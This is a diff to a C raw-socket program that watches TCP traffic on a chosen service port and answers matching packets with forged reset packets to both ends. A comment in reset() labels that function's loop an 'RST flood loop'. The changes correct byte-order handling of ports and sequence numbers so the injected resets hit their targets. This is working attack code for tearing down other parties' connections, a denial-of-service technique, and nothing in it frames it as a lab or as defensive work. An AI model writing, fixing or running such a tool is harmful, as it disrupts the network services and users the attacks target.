@@ -139,8 +139,8 @@ int main(int argc, char *argv[]) {
             if ((tcph -> dest != service_port) && (tcph -> source != service_port)) goto final;
             print_tcp_packet(buf, num); // log the packet
 
-            reset(iph->saddr, iph->daddr, tcph->source, tcph->dest, tcph->seq, tcph->ack_seq); // reset the receiver
-            reset(iph->daddr, iph->saddr, tcph->dest, tcph->source, tcph->ack_seq, tcph->seq); // reset the sender
+            reset(iph->saddr, iph->daddr, tcph->source, tcph->dest, ntohl(tcph->seq), ntohl(tcph->ack_seq)); // reset the receiver
+            reset(iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq), ntohl(tcph->seq)); // reset the sender
             goto final;
         }
     }
@@ -252,8 +252,8 @@ void reset(const uint32_t saddr, const uint32_t daddr,
     iph -> check = ip_checksum((void *) datagram, sizeof(struct iphdr) + tcp_len);
     
     // pack TCP header
-    tcph -> source = htons(sport); // source port
-    tcph -> dest = htons(dport); // destination port
+    tcph -> source = sport; // source port
+    tcph -> dest = dport; // destination port
     tcph -> seq = 0; // sequence number init to 0
     tcph -> ack_seq = 0; // ack sequence number init to 0
     tcph -> res1 = 0;
@@ -284,7 +284,7 @@ void reset(const uint32_t saddr, const uint32_t daddr,
 
     // build sockaddr
     sa.sin_family = AF_INET;
-    // sa.sin_port = htons(dport);
+    sa.sin_port = dport;
     sa.sin_addr.s_addr = daddr;
 
     // RST flood loop
